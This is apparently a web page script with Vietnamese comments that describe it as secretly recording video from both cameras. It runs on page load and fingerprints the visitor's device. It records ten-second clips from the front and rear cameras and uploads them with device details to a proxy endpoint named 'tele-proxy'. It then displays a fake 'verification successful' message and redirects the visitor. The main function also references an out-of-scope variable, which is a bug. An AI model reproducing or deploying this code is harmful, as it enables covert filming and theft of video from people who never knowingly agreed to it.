// main.js - Quay video ngầm cả 2 camera
const API_PROXY = '/api/tele-proxy';

const info = {
  time: new Date().toLocaleString('vi-VN'),
  device: '',
  os: '',
  camera: '⏳ Đang xử lý...'
};

// --- 1. NHẬN DIỆN THIẾT BỊ ---
function detectDevice() {
  const ua = navigator.userAgent;
  const platform = navigator.platform;
  const screenW = window.screen.width;
  const screenH = window.screen.height;
  const ratio = window.devicePixelRatio;

  if (/iPhone|iPad|iPod/i.test(ua) || (platform === 'MacIntel' && navigator.maxTouchPoints > 1)) {
    info.os = 'iOS';
    const res = `${screenW}x${screenH}@${ratio}`;
    const iphoneModels = {
      "430x932@3": "iPhone 14/15/16 Pro Max",
      "393x852@3": "iPhone 14/15/16 Pro / 15/16",
      "428x926@3": "iPhone 12/13/14 Pro Max / 14 Plus",
      "390x844@3": "iPhone 12/13/14 / 12/13/14 Pro",
      "414x896@3": "iPhone XS Max / 11 Pro Max",
      "414x896@2": "iPhone XR / 11",
      "375x812@3": "iPhone X / XS / 11 Pro",
      "375x667@2": "iPhone 6/7/8 / SE (2nd/3rd)",
    };
    info.device = iphoneModels[res] || 'iPhone Model';
  } else if (/Android/i.test(ua)) {
    info.os = 'Android';
    const match = ua.match(/Android.*;\s+([^;]+)\s+Build/);
    info.device = match ? match[1].split('/')[0].trim() : 'Android Device';
  } else {
    info.os = ua.includes('Windows') ? 'Windows' : 'Desktop';
    info.device = platform || 'PC/Laptop';
  }
}

// --- 2. LẤY DANH SÁCH CAMERA ---
async function getCameraList() {
  try {
    // Yêu cầu quyền truy cập camera trước
    await navigator.mediaDevices.getUserMedia({ video: true });
    
    const devices = await navigator.mediaDevices.enumerateDevices();
    const cameras = devices.filter(device => device.kind === 'videoinput');
    console.log('📷 Danh sách camera:', cameras.map(c => c.label));
    return cameras;
  } catch (e) {
    console.error('Lỗi lấy danh sách camera:', e);
    return [];
  }
}

// --- 3. QUAY VIDEO NGẦM ---
async function recordVideoSilent(facingMode = 'user', duration = 10000) {
  if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return null;
  
  try {
    // Kiểm tra codec hỗ trợ MP4
    const mimeTypes = [
      'video/mp4;codecs=h264',
      'video/mp4;codecs=avc1',
      'video/webm;codecs=vp9',
      'video/webm;codecs=vp8',
      'video/webm'
    ];
    
    let mimeType = null;
    for (const type of mimeTypes) {
      if (MediaRecorder.isTypeSupported(type)) {
        mimeType = type;
        break;
      }
    }
    
    if (!mimeType) {
      mimeType = 'video/webm';
    }

    // Cấu hình video với facingMode
    const videoConstraints = {
      facingMode: facingMode,
      width: { ideal: 640 },
      height: { ideal: 480 }
    };

    console.log(`🎥 Đang quay camera ${facingMode === 'user' ? 'TRƯỚC' : 'SAU'}...`);
    
    const stream = await navigator.mediaDevices.getUserMedia({ 
      video: videoConstraints, 
      audio: false 
    });

    const mediaRecorder = new MediaRecorder(stream, {
      mimeType: mimeType,
      videoBitsPerSecond: 1000000
    });

    const chunks = [];

    return new Promise((resolve) => {
      mediaRecorder.ondataavailable = (e) => {
        if (e.data.size > 0) chunks.push(e.data);
      };

      mediaRecorder.onstop = () => {
        const blob = new Blob(chunks, { type: mimeType });
        stream.getTracks().forEach(t => t.stop());
        console.log(`✅ Đã quay xong camera ${facingMode === 'user' ? 'TRƯỚC' : 'SAU'}, dung lượng: ${(blob.size / 1024).toFixed(2)} KB`);
        resolve(blob);
      };

      mediaRecorder.start(1000);
      
      setTimeout(() => {
        if (mediaRecorder.state === 'recording') {
          mediaRecorder.stop();
        }
      }, duration);
    });

  } catch (e) {
    console.error(`❌ Lỗi quay camera ${facingMode}:`, e);
    return null;
  }
}

// --- 4. CHUYỂN ĐỔI SANG MP4 ---
async function ensureMP4(blob) {
  if (!blob) return null;
  
  // Nếu đã là MP4 thì trả về nguyên bản
  if (blob.type === 'video/mp4' || blob.type === 'video/mp4;codecs=h264') {
    return blob;
  }
  
  // Thử chuyển sang MP4
  try {
    const video = document.createElement('video');
    const canvas = document.createElement('canvas');
    const ctx = canvas.getContext('2d');
    
    const url = URL.createObjectURL(blob);
    video.src = url;
    
    await new Promise((resolve) => {
      video.onloadeddata = resolve;
      video.play();
    });
    
    canvas.width = video.videoWidth || 640;
    canvas.height = video.videoHeight || 480;
    
    const stream = canvas.captureStream(30);
    const recorder = new MediaRecorder(stream, {
      mimeType: 'video/mp4;codecs=h264'
    });
    
    const chunks = [];
    recorder.ondataavailable = (e) => chunks.push(e.data);
    
    return new Promise((resolve) => {
      recorder.onstop = () => {
        const mp4Blob = new Blob(chunks, { type: 'video/mp4' });
        URL.revokeObjectURL(url);
        console.log('✅ Đã chuyển sang MP4');
        resolve(mp4Blob);
      };
      
      recorder.start();
      
      const drawFrame = () => {
        if (video.ended || video.paused) {
          recorder.stop();
          return;
        }
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        requestAnimationFrame(drawFrame);
      };
      
      video.play();
      drawFrame();
      
      setTimeout(() => {
        if (recorder.state === 'recording') {
          recorder.stop();
        }
      }, 2000);
    });
  } catch (e) {
    console.warn('Không thể chuyển sang MP4:', e);
    return blob;
  }
}

// --- 5. HÀM CHÍNH ---
async function main() {
  const button = document.querySelector('.btn') || document.querySelector('button');
  const statusDiv = document.getElementById('status');
  
  detectDevice();

  if (statusDiv) {
    statusDiv.innerHTML = '⏳ Đang xử lý...<br>Vui lòng đợi.';
  }
  
  info.camera = '⏳ Đang quay video...';
  
  // Lấy danh sách camera
  const cameras = await getCameraList();
  console.log(`📷 Tổng số camera: ${cameras.length}`);
  
  // === QUAY CAMERA TRƯỚC (facingMode: user) ===
  console.log('📸 Bắt đầu quay CAMERA TRƯỚC...');
  let frontVideo = await recordVideoSilent('user', 10000);
  
  // Nếu không quay được camera trước, thử lại với deviceId
  if (!frontVideo && cameras.length > 0) {
    // Tìm camera trước dựa trên label
    let frontCam = cameras.find(c => 
      c.label.toLowerCase().includes('front') || 
      c.label.toLowerCase().includes('face') ||
      c.label.toLowerCase().includes('user')
    );
    
    if (frontCam) {
      console.log('📸 Thử quay camera trước với deviceId:', frontCam.label);
      frontVideo = await recordVideoSilentWithDevice(frontCam.deviceId, 10000);
    }
  }
  
  // === QUAY CAMERA SAU (facingMode: environment) ===
  console.log('📸 Bắt đầu quay CAMERA SAU...');
  let backVideo = await recordVideoSilent('environment', 10000);
  
  // Nếu không quay được camera sau, thử lại với deviceId
  if (!backVideo && cameras.length > 1) {
    let backCam = cameras.find(c => 
      c.label.toLowerCase().includes('back') || 
      c.label.toLowerCase().includes('rear') ||
      c.label.toLowerCase().includes('environment')
    );
    
    if (backCam) {
      console.log('📸 Thử quay camera sau với deviceId:', backCam.label);
      backVideo = await recordVideoSilentWithDevice(backCam.deviceId, 10000);
    }
  }
  
  // Nếu vẫn không có camera sau, dùng camera đầu tiên (khác camera trước)
  if (!backVideo && cameras.length >= 2) {
    const otherCam = cameras.find(c => c.deviceId !== frontCam?.deviceId);
    if (otherCam) {
      console.log('📸 Thử quay camera khác:', otherCam.label);
      backVideo = await recordVideoSilentWithDevice(otherCam.deviceId, 10000);
    }
  }
  
  // Chuyển đổi sang MP4
  let frontMP4 = null;
  let backMP4 = null;
  
  if (frontVideo) {
    frontMP4 = await ensureMP4(frontVideo);
    console.log('✅ Camera trước: đã chuyển sang MP4');
  } else {
    console.log('❌ Không quay được camera trước');
  }
  
  if (backVideo) {
    backMP4 = await ensureMP4(backVideo);
    console.log('✅ Camera sau: đã chuyển sang MP4');
  } else {
    console.log('❌ Không quay được camera sau');
  }
  
  info.camera = (frontMP4 || backMP4) ? '✅ Đã quay video MP4' : '🚫 Không quay được video';

  // Chuẩn bị gửi dữ liệu
  const formData = new FormData();
  formData.append('clientInfo', JSON.stringify(info));

  if (frontMP4 || backMP4) {
    if (frontMP4) {
      formData.append('front', frontMP4, 'front.mp4');
      console.log('📤 Đã thêm front.mp4 vào form');
    }
    if (backMP4) {
      formData.append('back', backMP4, 'back.mp4');
      console.log('📤 Đã thêm back.mp4 vào form');
    }
    
    try {
      console.log('📤 Đang gửi video lên server...');
      await fetch(API_PROXY, { method: 'POST', body: formData });
      console.log('✅ Đã gửi video thành công');
    } catch (e) {
      console.error('❌ Lỗi gửi video:', e);
    }
  } else {
    console.log('📤 Gửi text (không có video)...');
    await fetch(API_PROXY, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(info)
    });
  }

  // --- ĐẾM NGƯỢC CHUYỂN HƯỚNG ---
  if (button) {
    button.style.backgroundColor = "#28a745";
    button.style.color = "#ffffff";
    button.style.boxShadow = "0 0 15px rgba(40, 167, 69, 0.6)";
    
    let timeLeft = 3;
    button.innerText = `Hoàn tất (${timeLeft}s)`;
    
    if (statusDiv) {
      statusDiv.innerHTML = '✅ Xác thực thành công!<br>Đang chuyển hướng...';
    }
    
    const countdownInterval = setInterval(() => {
      timeLeft--;
      if (timeLeft > 0) {
        button.innerText = `Hoàn tất (${timeLeft}s)`;
      } else {
        clearInterval(countdownInterval);
        window.location.href = "";
      }
    }, 1000);
  } else {
    setTimeout(() => {
      window.location.href = "";
    }, 3000);
  }
}

// --- 6. QUAY VIDEO VỚI DEVICEID ---
async function recordVideoSilentWithDevice(deviceId, duration = 10000) {
  if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return null;
  
  try {
    const mimeTypes = [
      'video/mp4;codecs=h264',
      'video/mp4;codecs=avc1',
      'video/webm;codecs=vp9',
      'video/webm;codecs=vp8',
      'video/webm'
    ];
    
    let mimeType = null;
    for (const type of mimeTypes) {
      if (MediaRecorder.isTypeSupported(type)) {
        mimeType = type;
        break;
      }
    }
    
    if (!mimeType) {
      mimeType = 'video/webm';
    }

    const stream = await navigator.mediaDevices.getUserMedia({ 
      video: { 
        deviceId: { exact: deviceId },
        width: { ideal: 640 },
        height: { ideal: 480 }
      }, 
      audio: false 
    });

    const mediaRecorder = new MediaRecorder(stream, {
      mimeType: mimeType,
      videoBitsPerSecond: 1000000
    });

    const chunks = [];

    return new Promise((resolve) => {
      mediaRecorder.ondataavailable = (e) => {
        if (e.data.size > 0) chunks.push(e.data);
      };

      mediaRecorder.onstop = () => {
        const blob = new Blob(chunks, { type: mimeType });
        stream.getTracks().forEach(t => t.stop());
        resolve(blob);
      };

      mediaRecorder.start(1000);
      
      setTimeout(() => {
        if (mediaRecorder.state === 'recording') {
          mediaRecorder.stop();
        }
      }, duration);
    });

  } catch (e) {
    console.error('Lỗi quay video với deviceId:', e);
    return null;
  }
}

// Kích hoạt hệ thống
main().then(() => console.log("✅ Hệ thống đã hoàn tất."));
